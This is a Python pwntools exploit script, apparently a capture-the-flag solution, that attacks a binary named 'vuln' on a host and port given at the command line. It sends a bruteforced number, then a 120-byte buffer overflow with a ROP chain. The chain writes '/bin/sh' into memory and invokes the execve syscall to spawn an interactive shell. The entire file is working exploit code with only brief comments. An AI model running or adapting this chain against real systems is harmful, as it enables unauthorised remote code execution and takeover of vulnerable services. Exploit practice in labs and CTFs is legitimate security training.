from pwn import *
import sys


# ____________________________RETRIEVING THE HOST AND PORT AT ENTRY__________________

if len(sys.argv) != 3:
    print('[-] Usage : python3 exploit.py <HOST> <PORT>')
    sys.exit(1)

host = sys.argv[1]
port = sys.argv[2]

# ___________________________________________________________________________________









# ________________________________CONNECTING TO THE SERVER_____________________

p = remote(host, port)
#p = elf.process()

# _____________________________________________________________________________







# _________ALL THE FILES WE NEED__________

elf = ELF("./vuln")
rop = ROP(elf)
context.arch = "amd64"

# ________________________________________





#_____________ADDRESSES NEEDED FOR THE PAYLOAD___________________

bruteforced_number = 84

#________________________________________________________________



#_____________________SENDING PAYLOAD____________________________

p.recvline()
p.sendline(str(bruteforced_number).encode())

#_______________________________________________________________








#____________________ADDRESSES NEEDED FOR SECOND PAYLOAD_____________

padding = "A" * 120

#ROPgadget --binary vuln --ropchain  -->  Write-WHat-Where Gadgets
mov_rsi_rax = 0x47ff91                                      # [+] Gadget found: 0x47ff91 mov qword ptr [rsi], rax ; ret
print(rop.find_gadget(["mov qword ptr [rsi], rax" , "ret"]))
pop_rsi = rop.find_gadget(["pop rsi" , "ret"]).address      # [+] Gadget found: 0x410ca3 pop rsi ; ret
pop_rax = rop.find_gadget(["pop rax" , "ret"]).address      # [+] Gadget found: 0x4163f4 pop rax ; ret
xor_rax_rax = 0x445950                                      # [+] Gadget found: 0x445950 xor rax, rax ; ret


#ROPgadget --binary vuln --ropchain  -->  Init syscall arguments gadgets
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address       # [+] Gdgaet found: 
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address       # [+] Gadget found: 0x44a6b5 pop rdx ; ret



#ROPgadget --binary vuln --ropchain  --> Syscall Gadget
syscall = 0x40137c                                          # [+] Gadget found: 0x40137c syscall




data_address = 0x00000000006bc3a0               #data address to store /bin/sh
bin_syscall = 29400045130965551                 #29400045130965551
execv = 0x3b                                    # 0x3b=59 in hexadecimal,it is the identifier of the execv method


#___________________________________________________________________










#____________________SENDING THE SECOND PAYLOAD _____________________

#step 1 : padding
payload = padding.encode()

#.
#.
#.
#.

#step 2 : Write What Where Gadgets
#pop rax (last one)
payload += p64(pop_rax)
payload += p64(bin_syscall)

#pop rsi (second one)
payload += p64(pop_rsi)
payload += p64(data_address)

#mov qword ptr[rsi], rax; ret (first one)
payload += p64(mov_rsi_rax)



payload += p64(pop_rax)
payload += p64(execv)

#.
#.
#.
#.

#step 3 : init syscall arguments gadgets
#pop rdi(first one)
payload += p64(pop_rdi)
payload += p64(data_address)

#pop rsi(second one)
payload += p64(pop_rsi)
payload += p64(0)

#pop rdx(third one)
payload += p64(pop_rdx)
payload += p64(0x0)

#.
#.
#.
#.

#step 4 : system call gadget
payload += p64(syscall)

#______________________________________________________________

p.recvline()
p.sendline(payload)


p.interactive()